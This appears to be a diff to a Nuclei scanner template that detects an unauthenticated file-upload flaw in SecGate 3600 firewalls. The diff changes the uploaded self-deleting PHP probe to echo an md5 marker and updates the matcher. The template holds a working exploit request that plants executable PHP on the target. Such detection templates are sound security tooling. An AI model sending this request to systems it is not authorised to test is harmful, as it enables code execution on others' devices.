@@ -16,8 +16,8 @@ info:
   tags: secgate,3600,firewall,file-upload,intrusive
 variables:
   filename: "{{rand_base(6)}}"
-  string: "{{randstr}}"
   file-upload: "{{rand_base(5)}}"
+  string: "secgate-3600-file-upload"
 
 http:
   - raw:
@@ -37,7 +37,7 @@ http:
         Content-Disposition: form-data; name="upfile"; filename="{{filename}}.php"
         Content-Type: text/plain
 
-        <?php echo "{{file-upload}}"; unlink(__FILE__); ?>
+        <?php echo md5("{{string}}");unlink(__FILE__);?>
 
         ------WebKitFormBoundary{{string}}
         Content-Disposition: form-data; name="submit_post"
@@ -54,11 +54,8 @@ http:
 
     matchers-condition: and
     matchers:
-      - type: dsl
-        dsl:
-          - status_code_2 == 200
-          - contains(body_2,'{{file-upload}}')
-          - contains(header_2,'text/html')
-        condition: and
-
-# digest: 490a00463044022000f7a446804d16688a2e6bd0ecb4c39abb59795da8559f0eff1c5c086fccd253022048085bb0719b371f98e0f447f501fa1b27dd721f6314c35ff9c42c22058b1d93:922c64590222798bb761d5b6d8e72950
+      - type: word
+        part: body
+        words:
+          - '{{md5(string)}}'
+# digest: 4a0a004730450220762f0a9de023ef72b212e2c26a9c5e6df64958bf09613b66ec7fa4b983612737022100a06761bdeacf0879ebe8ae8ea0d3ea2a7dae2f89b01fa38be843d2d706043af6:922c64590222798bb761d5b6d8e72950
